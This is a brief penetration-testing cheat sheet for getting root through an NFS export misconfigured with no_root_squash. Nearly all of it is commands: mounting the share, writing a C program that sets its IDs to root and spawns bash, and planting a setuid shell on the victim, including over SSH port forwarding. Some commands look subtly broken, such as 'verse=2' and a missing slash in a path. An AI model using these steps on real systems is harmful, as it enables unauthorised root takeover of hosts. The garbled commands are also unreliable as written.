NFS Root Squashing

Check for vulnerability

cat /etc/exports
  • you'll see no_root_squash

mkdir /tmp/mountme
mount -o rw,verse=2 <ip>:/tmp /tmp/mountme
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > tmp/mountme/x.c
gcc <file> -o <file>

# run the file
# NFS misconfig where all NFS is run as root

Example:


victim machine:
cat /etc/exports
/srv/Share 0.0.0.0/24(insecure,rw)
/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)

ssh -L 2049:127.0.0.1:2049 user@IP

mount -t nfs -o port=2049 127.0.0.1:/srv/Share /mnt/share

cp shell in /mnt/share

chmod +s shell

on victim machine:
./shell
